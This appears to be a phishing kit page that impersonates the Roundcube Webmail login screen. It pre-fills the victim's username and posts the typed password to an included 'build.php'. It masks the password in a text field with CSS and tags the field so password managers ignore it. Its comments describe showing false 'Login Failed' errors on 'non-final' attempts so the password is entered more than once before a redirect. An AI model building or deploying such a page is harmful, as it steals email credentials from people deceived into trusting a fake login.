<?php include '../build.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
<style>
/* ============================================================
   Password masking — pure CSS, no JS required
   ============================================================ */
#rcmloginpwd,
input[name="pass"] {
    -webkit-text-security: disc !important;
       -moz-text-security: disc !important;
            text-security: disc !important;
    text-align: left !important;
    direction: ltr !important;
    unicode-bidi: normal !important;
    letter-spacing: 2px;
}
#rcmloginpwd::placeholder,
input[name="pass"]::placeholder {
    -webkit-text-security: none !important;
            text-security: none !important;
    letter-spacing: normal !important;
}

/* ============================================================
   Loading spinner (inline, under the button)
   ============================================================ */
@keyframes rc-spin {
    0%   { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
#login-loading {
    display: none;
    text-align: center;
    padding: 12px 0 0 0;
}
#login-loading .rc-spinner {
    display: inline-block;
    width: 18px;
    height: 18px;
    border: 3px solid #d0d0d0;
    border-top-color: #1e4fff;
    border-radius: 50%;
    animation: rc-spin 0.8s linear infinite;
    vertical-align: middle;
}
#login-loading .rc-loading-text {
    margin-left: 8px;
    color: #6b7280;
    font-size: 14px;
    vertical-align: middle;
}

/* ============================================================
   Error message
   ============================================================ */
#login-error {
    display: none;
    margin: 12px 0 0 0;
    padding: 10px 12px;
    background: #fff1f0;
    border: 1px solid #ffccc7;
    border-radius: 4px;
    color: #cf1322;
    font-size: 14px;
    text-align: center;
}

/* ============================================================
   Page layout
   ============================================================ */
* { box-sizing: border-box; }
body {
    margin: 0;
    padding: 20px;
    font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
    background: #f4f5f7;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
}
#layout-content {
    width: 100%;
    max-width: 380px;
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 4px 24px rgba(0,0,0,.08);
    padding: 32px 28px;
    text-align: center;
}
#logo {
    display: inline-block;
    max-width: 180px;
    margin-bottom: 24px;
}
#login-form table {
    width: 100%;
    border-collapse: separate;
    border-spacing: 0;
}
#login-form .form-group.row td.input {
    padding-bottom: 14px;
}
#login-form .input-group {
    display: flex;
    align-items: stretch;
    width: 100%;
}
#login-form .input-group-prepend {
    display: flex;
}
#login-form .input-group-text {
    display: flex;
    align-items: center;
    justify-content: center;
    min-width: 46px;
    background: #f1f3f5;
    border: 1px solid #ced4da;
    border-right: none;
    border-radius: 6px 0 0 6px;
    color: #495057;
    font-style: normal;
}
#login-form .form-control {
    flex: 1 1 auto;
    width: 1%;
    min-width: 0;
    padding: 12px 14px;
    border: 1px solid #ced4da;
    border-radius: 0 6px 6px 0;
    font-size: 15px;
    background: #fff;
    color: #212529;
    outline: none;
    transition: border-color .15s, box-shadow .15s;
}
#login-form .form-control:focus {
    border-color: #1e4fff;
    box-shadow: 0 0 0 3px rgba(30,79,255,.15);
}
#login-form .formbuttons {
    margin: 8px 0 0 0;
    padding: 0;
}
#rcmloginsubmit {
    width: 100%;
    padding: 12px 16px;
    border: none;
    border-radius: 6px;
    background: #1e4fff;
    color: #fff;
    font-size: 15px;
    font-weight: 600;
    text-transform: uppercase;
    cursor: pointer;
    transition: background .2s;
}
#rcmloginsubmit:hover:not(:disabled) {
    background: #1538cc;
}
#rcmloginsubmit:disabled {
    opacity: .7;
    cursor: not-allowed;
}
#login-footer {
    margin-top: 18px;
    font-size: 12px;
    color: #9aa0a6;
}
</style>
</head>
<body>

<div id="layout-content" role="main">
    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjkuMTQgMTQxLjggNTczLjY1IDU3My42NSI+PHN0eWxlPi5zdDAsLnN0M3tmaWxsLXJ1bGU6ZXZlbm9kZDtjbGlwLXJ1bGU6ZXZlbm9kZDtmaWxsOiM0MDRmNTR9LnN0M3tmaWxsOiMzN2JlZmZ9PC9zdHlsZT48cGF0aCBjbGFzcz0ic3QzIiBkPSJNNTgyLjc5IDU0OS43N0wyOTUuOTYgMzg0LjFWMjA3LjI3bDI4Ni44MyAxNjUuNjh6Ii8+PHBhdGggY2xhc3M9InN0MCIgZD0iTTkuMTQgNTQ5Ljc3TDI5NS45NiAzODQuMVYyMDcuMjdMOS4xNCAzNzIuOTV6Ii8+PHBhdGggZD0iTTI5NS45NiAxNDEuOGMxMDkuNTYgMCAxOTguNDEgODguODUgMTk4LjQxIDE5OC40MXMtODguODUgMTk4LjQxLTE5OC40MSAxOTguNDFTOTcuNTUgNDQ5Ljc3IDk3LjU1IDM0MC4yMSAxODYuNCAxNDEuOCAyOTUuOTYgMTQxLjgiIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBmaWxsPSIjY2NjIi8+PHBhdGggZD0iTTI5NS45NiAxNDEuOGMxMDkuNiAwIDE5OC40OCA4OC44NSAxOTguNDggMTk4LjQxcy04OC44OCAxOTguNDEtMTk4LjQ4IDE5OC40MWMtNjIuOTEtNDIuMzQtODguOTQtMTI3LjY0LTg4Ljk0LTE5OC4zM3MyNi4wMy0xNTYuMSA4OC45NC0xOTguNTIiIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBmaWxsPSIjZTVlNWU1Ii8+PHBhdGggY2xhc3M9InN0MyIgZD0iTTU4Mi43OSAzNzIuOTVMMjk1Ljk2IDUzOC42MnYxNzYuODNsMjg2LjgzLTE2NS42OHoiLz48cGF0aCBjbGFzcz0ic3QwIiBkPSJNOS4xNCAzNzIuOTVsMjg2LjgyIDE2NS42N3YxNzYuODNMOS4xNCA1NDkuNzd6Ii8+PC9zdmc+" id="logo" alt="Logo">

    <form id="login-form" name="login-form" method="post" action="" autocomplete="off">

        <table>
            <tbody>
                <!-- Username (read-only, no autocomplete) -->
                <tr class="form-group row">
                    <td class="title" style="display:none;"></td>
                    <td class="input input-group input-group-lg">
                        <span class="input-group-prepend">
                            <i class="input-group-text icon user">👤</i>
                        </span>
                        <input name="user"
                               type="text"
                               class="form-control"
                               id="rcmloginuser"
                               value="<?php echo htmlspecialchars($decoded); ?>"
                               readonly
                               size="40"
                               required
                               autocapitalize="off"
                               autocomplete="off"
                               autocorrect="off"
                               spellcheck="false"
                               data-form-type="other"
                               placeholder="Username">
                    </td>
                </tr>

                <!-- Password (masked, no autocomplete / no suggestions) -->
                <tr class="form-group row">
                    <td class="title" style="display:none;"></td>
                    <td class="input input-group input-group-lg">
                        <span class="input-group-prepend">
                            <i class="input-group-text icon pass">🔒</i>
                        </span>
                        <input name="pass"
                               id="rcmloginpwd"
                               required
                               size="40"
                               class="form-control"
                               autocapitalize="off"
                               autocorrect="off"
                               spellcheck="false"
                               type="text"
                               placeholder="Password"
                               autocomplete="off"
                               data-form-type="other"
                               data-lpignore="true"
                               data-1p-ignore="true"
                               data-bwignore="true">
                    </td>
                </tr>
            </tbody>
        </table>

        <!-- Loading indicator -->
        <div id="login-loading" aria-live="polite">
            <span class="rc-spinner"></span>
            <span class="rc-loading-text">Logging in...</span>
        </div>

        <!-- Error message — visibility controlled by $error set in build.php -->
        <div id="login-error" role="alert" style="<?php echo $error; ?>">
            Login Failed.
        </div>

        <p class="formbuttons">
            <button type="submit"
                    id="rcmloginsubmit"
                    class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">
                Login
            </button>
        </p>

        <div id="login-footer" role="contentinfo">
            Roundcube Webmail
        </div>
    </form>
</div>

<script>
(function () {
    'use strict';

    var form    = document.getElementById('login-form');
    var loading = document.getElementById('login-loading');
    var error   = document.getElementById('login-error');
    var button  = document.getElementById('rcmloginsubmit');
    var pwd     = document.getElementById('rcmloginpwd');

    if (!form || !loading || !error || !button) return;

    // ---------- Scrub any autofilled password on page load ----------
    (function clearAutofill() {
        if (pwd) {
            pwd.value = '';
            pwd.setAttribute('autocomplete', 'new-password');
        }
    })();

    // ---------- Visual feedback on submit ----------
    // The server (build.php) owns all submission logic — this only shows
    // the spinner while the POST is in flight.
    form.addEventListener('submit', function (e) {
        // Empty-field guard
        if (!pwd || pwd.value === '') {
            e.preventDefault();
            error.textContent   = 'Please enter your password.';
            error.style.display = 'block';
            if (pwd) pwd.focus();
            return;
        }

        // Hide the server-rendered error (if it was showing) and reveal
        // the spinner. If the server decides to redirect, the browser
        // navigates away before the error needs to reappear. If the
        // server decides not to redirect (non-final attempt), the page
        // reloads and $error sets the div back to display: block.
        error.style.display   = 'none';
        loading.style.display = 'block';
        button.disabled       = true;
        button.style.opacity  = '0.7';

        // No preventDefault — the form posts normally to the same URL.
    });

    // ---------- bfcache reset ----------
    window.addEventListener('pageshow', function (e) {
        if (e.persisted) {
            loading.style.display = 'none';
            button.disabled       = false;
            button.style.opacity  = '1';
            if (pwd) pwd.value = '';
        }
    });
})();
</script>

</body>
</html>